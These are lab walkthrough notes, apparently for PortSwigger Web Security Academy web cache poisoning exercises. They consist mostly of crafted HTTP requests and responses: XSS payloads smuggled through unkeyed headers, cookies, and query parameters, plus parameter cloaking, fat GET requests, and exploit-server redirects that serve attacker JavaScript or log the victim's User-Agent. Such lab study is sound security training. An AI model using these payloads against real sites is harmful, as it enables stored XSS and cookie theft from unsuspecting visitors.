### Web cache poisoning with an unkeyed header

```
GET / HTTP/1.1
Host: 0a9c00c60376a5c6c0ed3e2500950097.web-security-academy.net
X-Forwarded-Host: evil-user.net
```

```
GET / HTTP/1.1
Host: 0a9c00c60376a5c6c0ed3e2500950097.web-security-academy.net
X-Forwarded-Host: evil-user.net">
```

```
GET / HTTP/1.1
Host: 0a9c00c60376a5c6c0ed3e2500950097.web-security-academy.net
X-Forwarded-Host: evil-user.net"></script>
```

```
GET / HTTP/1.1
Host: 0a9c00c60376a5c6c0ed3e2500950097.web-security-academy.net
X-Forwarded-Host: evil-user.net"></script><script>alert(document.cookie)</script>
```

By right way (with exploit server):

```
GET / HTTP/1.1
Host: 0ae1008e04a56000c06a13f8007a0000.web-security-academy.net
X-Forwarded-Host: evil-user.net
```

```
<script type="text/javascript" src="//evil-user.net/resources/js/tracking.js"></script>
```

```
GET / HTTP/1.1
Host: 0ae1008e04a56000c06a13f8007a0000.web-security-academy.net
X-Forwarded-Host: exploit-0ab8003e04df60ffc0571389018100f0.exploit-server.net
```

```
/resources/js/tracking.js

alert(document.cookie)
```

### Web cache poisoning with an unkeyed cookie

```
GET / HTTP/1.1
Host: 0a7d0025040ae5e3c0a51c3b003d0088.web-security-academy.net
Cookie: session=0u2q9XAfJFr8Wyhzexw3WuuG21lTaBjG; fehost=change_me
```

```
GET / HTTP/1.1
Host: 0a7d0025040ae5e3c0a51c3b003d0088.web-security-academy.net
Cookie: session=0u2q9XAfJFr8Wyhzexw3WuuG21lTaBjG; fehost=prod-cache-03"}
```

```
GET / HTTP/1.1
Host: 0a7d0025040ae5e3c0a51c3b003d0088.web-security-academy.net
Cookie: session=0u2q9XAfJFr8Wyhzexw3WuuG21lTaBjG; fehost=prod-cache-03"}</script><script>alert(1)</script>
```

### Web cache poisoning with multiple headers

Poison the cache of retrieving javascript files

```
GET /resources/js/tracking.js HTTP/1.1
Host: 0ae4002b039ec80fc0b31ac900d600de.web-security-academy.net
X-Forwarded-Scheme: a
X-Forwarded-Host: exploit-0a8100b00346c86cc0001a5f01f0004b.exploit-server.net/exploit.js
```

```
HTTP/1.1 302 Found
Location: https://exploit-0a8100b00346c86cc0001a5f01f0004b.exploit-server.net/exploit.js/resources/js/tracking.js
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 0
```

Keep sending this request:

```
GET /resources/js/tracking.js HTTP/1.1
Host: 0ae4002b039ec80fc0b31ac900d600de.web-security-academy.net
X-Forwarded-Scheme: ZXZCZC
X-Forwarded-Host: exploit-0a8100b00346c86cc0001a5f01f0004b.exploit-server.net
```

```
/resources/js/tracking.js
alert(document.cookie)
```

Till your response is this:

```
HTTP/1.1 302 Found
Location: https://exploit-0a8100b00346c86cc0001a5f01f0004b.exploit-server.net/resources/js/tracking.js
Cache-Control: max-age=30
Age: 12
X-Cache: hit <- must hit
Connection: close
Content-Length: 0
```

### Targeted web cache poisoning using an unknown header

<img width="960" alt="image" src="https://user-images.githubusercontent.com/56427824/195282333-70164d66-4201-4b45-8471-0f4bdd9c60df.png">

Without exploit server

```
GET / HTTP/1.1
Host: 0a48000004c844e1c05d17e3009f0040.web-security-academy.net
X-Host: asdasdasd"></script><script>alert(document.cookie)</script>
Cookie: session=pr5OvwBna0H3FV03uvYT9eUKGoAGdTRI
```

With exploit server

```
GET / HTTP/1.1
Host: 0a48000004c844e1c05d17e3009f0040.web-security-academy.net
X-Host: exploit-0a0200db04b04402c0ec177d0155001e.exploit-server.net
```

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Vary: User-Agent
Cache-Control: max-age=30
Age: 4
X-Cache: hit
Connection: close
Content-Length: 5875
```

Vary looks at User-Agent

Need to get victim User-Agent

<img width="942" alt="image" src="https://user-images.githubusercontent.com/56427824/195285757-96927661-c524-4683-8354-208c6691f8a1.png">

```
<img src="https://exploit-0a0200db04b04402c0ec177d0155001e.exploit-server.net/log">
```

User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.61 Safari/537.36

Final Answer:

```
GET / HTTP/1.1
Host: 0a48000004c844e1c05d17e3009f0040.web-security-academy.net
X-Host: asdasdasd"></script><script>alert(document.cookie)</script>
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.61 Safari/537.36
```

### Web cache poisoning via an unkeyed query string

```
GET /?'></head><script>alert(1)</script> HTTP/1.1
Host: 0a9d00f70391a8d2c00d314300ec0080.web-security-academy.net
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: */*,text/cachebuster,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate, cachebuster
Cookie: cachebuster=1
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Language: en-US,en;q=0.9
Connection: close
```

### Web cache poisoning via an unkeyed query parameter

Use Param Miner's "Guess GET parameters"

```
GET /?asd=asd HTTP/1.1
Host: 0af2003b035fb3dcc0b31ddf002000d5.web-security-academy.net
```

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=uVBpELI77LgS5WdIkh0Lo58WvVzvlfNM; Secure; HttpOnly; SameSite=None
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Connection: close
Content-Length: 8285
```

```
GET /?utm_content=123123123123&asd=qwe HTTP/1.1
Host: 0af2003b035fb3dcc0b31ddf002000d5.web-security-academy.net
```

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=Naq7cahesrhqRlg7wJnxuAqhIfOkIGzb; Secure; HttpOnly; SameSite=None
Set-Cookie: utm_content=123123123123; Secure; HttpOnly
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Connection: close
Content-Length: 8310
```

```
GET /?utm_content='/> HTTP/1.1
Host: 0af2003b035fb3dcc0b31ddf002000d5.web-security-academy.net
```

```
<link rel="canonical" href='//0af2003b035fb3dcc0b31ddf002000d5.web-security-academy.net/?utm_content='/>'/>
```

Answer:

```
GET /?utm_content='/><script>alert(1)</script> HTTP/1.1
Host: 0af2003b035fb3dcc0b31ddf002000d5.web-security-academy.net
```

Send above request via repeater until you can observe the injected script when you access the home directory

```
GET / HTTP/1.1
Host: 0af2003b035fb3dcc0b31ddf002000d5.web-security-academy.net
```

### Parameter cloaking

Enumerate website and find javascript being used at following path `/js/geolocate.js`

Param Miner loaded, right-click on the request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically.

<img width="733" alt="image" src="https://user-images.githubusercontent.com/56427824/195496924-e76b6bbe-23db-4fb8-bc4a-2f4b2a8a1e85.png">

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)%3Balert HTTP/1.1
Host: 0a5e006004b46014c0e110ae00cf00e4.web-security-academy.net
Cookie: country=[object Object]
```

```
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Set-Cookie: session=aTaRoSBKHizPthOUmpuprQZGtIsc5Ytj; Secure; HttpOnly; SameSite=None
Set-Cookie: utm_content=foo; Secure; HttpOnly
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Connection: close
Content-Length: 199

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1);alert({"country":"United Kingdom"});
```

If cache is successfully poisoned, you should be able to see the changed javascript on

https://0a5e006004b46014c0e110ae00cf00e4.web-security-academy.net/js/geolocate.js?callback=setCountryCookie

### Web cache poisoning via a fat GET request

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: 0a04006c03dd787cc0141a7f00de00f0.web-security-academy.net
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 w4pwdkn65
Sec-Ch-Ua-Platform: "Windows"
Accept: */*, text/w4pwdkn65
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0a04006c03dd787cc0141a7f00de00f0.web-security-academy.net/
Accept-Encoding: gzip, deflate, w4pwdkn65
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
X-HTTP-Method-Override: POST
X-HTTP-Method: POST
X-Method-Override: POST

callback=alert(1);alert
```

Generate request using Param Miner, fat GET request

Remove Origin from generated request header

https://0a04006c03dd787cc0141a7f00de00f0.web-security-academy.net/js/geolocate.js?callback=setCountryCookie

### URL normalization

Possible XSS vulnerability by going to an invalid path like `/asd`

```
GET /asd<script>alert(1)</script> HTTP/1.1
Host: 0abb001304c24c42c00fd93a008e00a1.web-security-academy.net
```



